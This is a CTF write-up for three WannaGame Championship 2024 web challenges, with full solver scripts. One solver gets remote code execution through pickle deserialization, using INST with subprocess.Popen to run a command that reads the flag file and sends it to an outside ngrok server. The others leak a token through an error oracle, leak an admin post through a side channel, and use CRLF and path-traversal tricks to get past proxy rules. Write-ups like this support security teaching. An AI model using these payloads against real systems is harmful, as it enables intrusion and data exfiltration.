---
title: "WannaGame Championship 2024 - writeup"
date: "2024-12-14T00:00:00.000Z"
lang: EN
---


## ✅ Pickleball (379pts 22 solves)

### Overview

```python
@app.route("/process", methods=["GET", "POST"])
def process():
    if "username" not in session:
        return redirect(url_for("login"))

    error = None
    disassembled_output = None

    banned_patterns = [b"\\", b"static", b"templates", b"flag.txt", b">", b"/", b"."]
    banned_instruction = "REDUCE"

    if request.method == "POST":
        payload = request.form.get("payload", "")
        try:
            decoded_data = base64.b64decode(payload)

            for pattern in banned_patterns:
                if pattern in decoded_data:
                    raise ValueError("Payload contains banned characters!")

            try:
                output = io.StringIO()
                pickletools.dis(decoded_data, out=output)
                disassembled_output = output.getvalue()

                if banned_instruction in disassembled_output:
                    raise ValueError(
                        f"Payload contains banned instruction: {banned_instruction}"
                    )

            except Exception as e:
                disassembled_output = "Error!"

            pickle.loads(decoded_data)

        except Exception as e:
            error = str(e)

    return render_template(
        "process.html", error=error, disassembled_output=disassembled_output
    )
```

On the `/process` endpoint, you can load a pickle. However, there are several limitations:
* Some words are banned:
    ```
    [b"\\", b"static", b"templates", b"flag.txt", b">", b"/", b"."]
    ```
* Instruction `REDUCE` is banned

Without `REDUCE`, we cannot call any function. As a result, we cannot use functions like `os.system` or `exec`.

### Solution

There is an alternative to `REDUCE`: `OBJ` and `INST`. Although you still cannot call normal functions, you can instantiate any class.

This is how they are implemented. (Copied from [pickle.py](https://github.com/python/cpython/blob/90ae4b6f5a07cbd600f047919adfce46ba7edc16/Lib/pickle.py#L1528))

```python:pickle.py
    def _instantiate(self, klass, args):
        if (args or not isinstance(klass, type) or
            hasattr(klass, "__getinitargs__")):
            try:
                value = klass(*args)
            except TypeError as err:
                raise TypeError("in constructor for %s: %s" %
                                (klass.__name__, str(err)), err.__traceback__)
        else:
            value = klass.__new__(klass)
        self.append(value)

    def load_inst(self):
        module = self.readline()[:-1].decode("ascii")
        name = self.readline()[:-1].decode("ascii")
        klass = self.find_class(module, name)
        self._instantiate(klass, self.pop_mark())
    dispatch[INST[0]] = load_inst

    def load_obj(self):
        # Stack is ... markobject classobject arg1 arg2 ...
        args = self.pop_mark()
        cls = args.pop(0)
        self._instantiate(cls, args)
    dispatch[OBJ[0]] = load_obj
```

[`subprocess.Popen`](https://docs.python.org/3.13/library/subprocess.html#subprocess.Popen) accepts shell commands as its constructor arguments, and runs the commands as soon as it gets instantiated. By combining this with `INST`, we can run arbitrary shell commands.

I used Python command to send the content of `/flag` to my server. Because certain words and characters are banned, I encoded them in Base64.

### Full exploit

```python:solver.py
import base64
import requests
import pickle
from struct import pack

URL = "http://fbc65afab162328491c2667f0bfdb097.chall.w1playground.com:8082/"
# URL = "http://localhost:3002/"
EVIL = "https://xxx.ngrok.app/"

s = requests.session()
data = {
    "username": "tchen",
    "password": "pass"
}
r = s.post(URL + "register", data=data)
r = s.post(URL + "login", data=data)
print(r.status_code)
print(r.text)
cmd = 'cat /flag'
script = f"from urllib.request import urlopen;import os;urlopen('{EVIL}',data=os.popen('{cmd}').read().encode())"

cmd = ["python", "-c", f"from base64 import b64decode;exec(b64decode(b'{base64.b64encode(script.encode()).decode()}'))"]

def pklstr(s):
    return pickle.BINSTRING + pack('<i', len(s)) + s.encode()
        
        
pkl = (
    pickle.MARK + 
    pickle.MARK + 
    b"".join([pklstr(c) for c in cmd]) + 
    pickle.LIST + 
    pickle.INST + b"subprocess\nPopen\n"
)

r = s.post(URL + "process", data={
    "payload": base64.b64encode(pkl)
})
```

## ✅ leak (480pts 10 solves)

### Overview

![](/assets/blog/wannagame/image.png)

On this website, you can browse and search for premade posts. The goal of the challenge is to retrieve the content of the post created by the admin.

```python:app.py
def auth(token):
    tmp = token
    if type(token) == list:
        tmp = "".join(tmp)
    pat = re.compile("^\d+$")
    if pat.match(tmp) == None:
        return False
    for i in range(len(AUTHENTICATION_TOKEN)):
        if int(token[i]) != int(AUTHENTICATION_TOKEN[i]):
            print(token[i], flush=True)
            return False
    return True

""" snap """

@app.route("/search")
def do_search():
    res = Response()
    res.headers['Content-Security-Policy'] = g.csp
    res.response = render_template("error.html")
    if auth(request.args.get('token', request.args.getlist('token[]'))):
        try:
            keyword = request.args.get('k', "")
            cursor = con.cursor()
            is_admin = False
            if request.cookies.get("SECRET_TOKEN"):
                if request.cookies.get("SECRET_TOKEN") == SECRET_TOKEN:
                    is_admin = True

            posts = cursor.execute("SELECT author, content FROM posts WHERE content like ?", (keyword.replace("%", "").replace("?", "") + "%",)).fetchall()
            
            res.response = render_template("list.html", posts=posts, is_admin=is_admin, nonce=g.nonce)
        except:
            pass
    return res
```

```html:list.html
<body>
    <div class="container">
        <h1>Search Results</h1>
        <div class="results" id="results">
            {% if posts|count > 0 %}
                <img id="customImage" src="" loading="lazy"/>
            {% endif %}
            {% for post in posts %}
                {% if not is_admin and post[0] == 'admin' %}
                {% else %}
                <div class="result-item">
                    <p>{{post[0]}}</p>
                    <p>{{post[1]}}</p>
                </div>
                {% endif %}

            {% endfor %}
        </div>
    </div>
</body>
```

There are some measures in place to prevent us from viewing the admin's post:
* You cannot search unless you provide `token` that matches `AUTHENTICATION_TOKEN`.
* The post created by admin will not appear unless you are an admin yourself.

### Solution

There is a flaw in code for checking if the `token` that matches `AUTHENTICATION_TOKEN`. 
```python
for i in range(len(AUTHENTICATION_TOKEN)):
    if int(token[i]) != int(AUTHENTICATION_TOKEN[i]):
        print(token[i], flush=True)
        return False
```
When we provide a single digit `0` for token:
* If `AUTHENTICATION_TOKEN` *does not* start with `0`, then the `auth(token)` returns `False` and `error.html` will show up.
* If `AUTHENTICATION_TOKEN` *does* start with `0`, then the code tries to access `token[1]`, which causes `IndexError`. Hence, `Internal Server Error` will show up.

You can repeat this for each digit to leak the full token. This enable us to access the searching feature.

We still cannot see the content for the admin's post. There was a hint in the "leak revenge" challenge.


```diff html
--- web_leak/app/templates/list.html    2024-11-27 06:02:29.000000000 +0900
+++ web_leak-revenge/leak/give_to_player/app/templates/list.html        2024-12-13 17:30:34.000000000 +0900
@@ -71,7 +71,7 @@
     <div class="container">
         <h1>Search Results</h1>
         <div class="results" id="results">
-            {% if posts|count > 0 %}
+            {% if posts|count > 0 and is_admin %}
                 <img id="customImage" src="" loading="lazy"/>
             {% endif %}
             {% for post in posts %}
                                       
```

`<img id="customImage" src="" loading="lazy"/>` only appears if there is at least one matched post for the query. This holds true even if the matched post was created by the admin but is **not** displayed to non-admin users (which was fixed in the revenge version). In other words, you can determine whether your query matches the admin's post based on whether the image element appears, even without seeing the admin's post itself.

By leveraging this information, we can leak the post content letter by letter.

### Full exploit

```python:solver.py
import requests

URL = "http://chall.w1playground.com:22222/"
# URL = "http://localhost:1337/"

s = requests.session()

known = ""

for _ in range(64):
    for i in range(10):
        r = s.get(URL + "search", params={
            "token": known + str(i)
        })
        if r.status_code == 500 or "Search Results" in r.text:
            known += str(i)
            print(known)
            break
    else:
        break
    
token = known
known = "W1{"

while True:
    for i in range(10):
        r = s.get(URL + "search", params={
            "token": token,
            "k": known + str(i),
            "img": "troll.jpg"
        })
        if '<img id="customImage" src="" loading="lazy"/>' in r.text:
            known += str(i)
            print(known)
            break
    else:
        break
```

## ✅ re gekco (491pts 7 solves)

### Overview

There are three virtual servers running:

1. Proxy server (port 80)
    * Runs on Nginx
    * If the path matches `~* ^(.*)$`, it returns `i catch you!`
    * If the path matches `/firefly`, it is proxied to inner server.
    ```nginx
    server {
        listen 80;
        server_name _;

        location ~* ^(.*)$ {
            return 200 "i catch you!";
        }

        location / {
            add_header X-Original "$uri";
            return 200 "I Catch You!";
        }

        location /firefly {
            proxy_pass http://@inner$uri$is_args$args;
        }
    }
    ```
2. Inner server (port 3000)
    * Runs on express
    * If the path doesn't match `^[A-z0-9.\s_-]+$`, it returns an error.
    * Otherwise, it is proxied to Re-Gecko server.
    * It removes the word `flag` using `path.replace(re, "");`
    ```javascript:inner/index.js
    app.all("*", async (req, res) => {
        try {
            var { method, path, body, headers } = req;
            console.log(method, path, body, headers);
            console.log(path);
            path = path.startsWith("/") ? path.slice(1) : path;
            console.log(path);
            const checkvar = (path) => {
                try {
                    if (!path) throw new Error("no path");
                    const regex = new RegExp(/^[A-z0-9.\s_-]+$/i);
                    if (regex.test(path)) {
                        const checked_path = path.replaceAll(/\s/g, "");
                        return checked_path;
                    } else {
                        throw new Error("Error!!");
                    }
                } catch (e) {
                    console.log(e);
                    return "something went wrong";
                }
            };
            path = checkvar(path);
            path = path;

            var re = /flag/i;
            if (re.exec(path)) {
                path = path.replace(re, "");
            }

            let url = new URL(path, RE_GECKO_URL);

            const options = {
                method,
                hostname: url.hostname,
                port: url.port,
                path: url.pathname,
                headers: { ...headers, host: url.hostname },
            };

            const request = http.request(options, (response) => {
            let data = "";
            response.on("data", (chunk) => {
                data += chunk;
            });
            response.on("end", () => {
                res.status(response.statusCode).send(data);
            });
            });

            request.on("error", (error) => {
            console.error("Error forwarding request:", error.message);
            res.status(500).send({ error: "Failed to forward request" });
            });

            request.end();
        } catch (error) {
            console.error("Error forwarding request:", error.message);
            res.status(500).send({ error: "Failed to forward request" });
        }
    });
    ```
3. Re-gecko server (port 8082)
    * Runs on nginx
    * If the path matches `/flag`, it returns flag.
    ```nginx
    server {
        listen 8082;
        server_name flagg;
        include flags.conf;

        location /firefly {
            return 200 "Just look at the sky, you will see ....";
        }

         location /firefly/jxx {
            add_header X-Origin "$uri";
            return 200 ".. you will see a star named ...";
        }

        
        location /inner {
            return 200 "nothing here for you, you wanna know star's name????";
        }

        location /flag {
            return 200 "$flag";
        }
    }
    ```
### Solution

In the first proxy server, most paths will match `^(.*)$`. However, we can use the fact that line breaks don't match the `.` character in regular expression.

The path such as `/firefly%0a%0d` will match `/firefly` but not `^(.*)$`. Hence, the request will be proxied to the inner server.

The path we want to achieve in the end is `/flag`. Hence, we need to somehow remove `/firefly` part. One way to do this is by accessing `/firefly/../flag`. When this is passed to `new URL(path, RE_GECKO_URL)`, it will simplify to `/flag`.

This is not possible because the inner server blocks any request that doesn't match `^[A-z0-9.\s_-]+$`. However, in regex, `[A-z]` matches all the characters that has character code between `A` and `z`. This includes not only `A-Z` and `a-z`, but also `[\]^_`. Utilizing this fact, we can use `/firefly\..\flag` instead. This will also simplifies to `/flag`.

Lastly, the word `flag` is removed by `path.replace(re, "");`. Because `String.prototype.replace` only replace the string once (see [mdn](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace)), we can repeat `flag` twice, and the second occurrence will be kept.

### Full exploit

```python
import requests

URL = "http://localhost:8001/"
# URL = "http://e11f0e81aab93506a328a8a6ac8b1156.chall.w1playground.com:8082/"

r = requests.get(URL + "firefly\\..\\flagflag%0a%0d")
print(r.text)
```
